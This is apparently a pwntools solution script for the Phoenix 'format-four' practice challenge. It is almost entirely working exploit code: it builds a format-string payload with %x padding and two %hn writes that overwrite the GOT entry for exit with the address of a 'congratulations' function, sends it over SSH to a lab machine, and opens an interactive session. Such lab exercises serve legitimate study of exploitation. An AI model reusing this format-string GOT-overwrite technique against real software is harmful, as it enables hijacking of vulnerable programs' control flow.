#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])
# exe = context.binary = ELF('format-four_32')
exe = context.binary = ELF('format-four_32')

host = args.HOST or 'localhost'
port = int(args.PORT or 2222)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
# remote_path = '/opt/phoenix/amd64/format-four'
remote_path = '/opt/phoenix/i486/format-four'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def write_that_there(that,there,offset,written):
    def compute_off(target,prev):
        if prev == 0x4d:
            plus = 8
        else:
            plus = 0
        if target > prev+8:
            return target-prev+plus
        else:
            return target+0x10000-prev+plus

    data = b''
    data += p32(there)
    data += b'JUNK'
    data += p32(there+2)
    data += b'JUNK'

    data += b'%x'*(offset-2)
    prev = written
    h1 = that>>16
    h2 = that&0x0000ffff
    data += b'%'+str(compute_off(h2,prev)).encode()+b'x'
    data += b'%hn'
    data += b'%'+str(compute_off(h1,h2)).encode()+b'x'
    data += b'%hn'
    return data

# -- Exploit goes here --

io = start()

that = exe.symbols['congratulations']
there = exe.got['exit']
buf = write_that_there(that,there,12,0x4d)

io.sendline(buf)

io.interactive()

